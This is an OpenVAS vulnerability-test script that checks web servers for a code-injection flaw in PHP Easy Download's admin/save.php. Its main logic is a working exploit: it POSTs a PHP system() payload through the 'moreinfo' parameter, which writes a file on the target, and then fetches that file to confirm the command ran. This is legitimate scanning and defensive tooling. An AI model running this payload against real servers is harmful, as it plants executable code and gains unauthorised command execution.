###############################################################################
# OpenVAS Vulnerability Test
#
# PHP Easy Download admin/save.php Parameter Code Injection Vulnerability
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2008 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80076");
  script_version("2022-05-11T11:17:52+0000");
  script_tag(name:"last_modification", value:"2022-05-11 11:17:52 +0000 (Wed, 11 May 2022)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PHP Easy Download admin/save.php Parameter Code Injection Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2008 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/2812");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21179");

  script_tag(name:"summary", value:"The version of PHP Easy Download installed on the remote host fails to
  sanitize input to the 'moreinfo' parameter before using it in the 'save.php' script.");

  script_tag(name:"impact", value:"By sending a specially-crafted value, an attacker can store and execute code at the privilege level
  of the remote web server.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("url_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port)) exit(0);

vtstrings = get_vt_strings();
filename = string(vtstrings["lowercase_rand"], ".php");
cmd = "id";
code = urlencode(str:string('<?php system(', cmd, "); ?>"));

foreach dir( make_list_unique( "/easydownload", "/phpeasydownload", "/download", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir,"/file_info/admin/save.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (!res) continue;

  if ("# of Accesses:" >< res) {
    data = string("description=0&moreinfo=", code, "&accesses=0&filename=", filename, "&date=&B1=Submit");
    attackreq = http_post(port:port, item:url, data:data);
    attackreq = ereg_replace(string:attackreq, pattern:"Content-Length: ", replace: string("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: "));
    attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
    if (!attackres) continue;

    http_check_remote_code(unique_dir:dir, check_request:string("/file_info/descriptions/",filename,".0"), check_result:"uid=[0-9]+.*gid=[0-9]+.*", command:"id", port:port);
  }
}

exit( 0 );
